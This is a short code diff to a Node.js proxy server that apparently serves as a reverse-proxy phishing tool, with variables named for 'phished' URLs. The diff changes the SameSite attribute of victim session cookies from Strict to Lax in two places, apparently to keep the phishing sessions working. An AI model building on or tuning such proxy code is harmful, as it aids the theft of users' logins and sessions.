@@ -104,7 +104,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                 clientResponse.setHeader("Set-Cookie", cookieHeader);
                 console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                 session = cookieName;
@@ -164,7 +164,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                                         clientResponse.setHeader("Set-Cookie", cookieHeader);
                                         console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
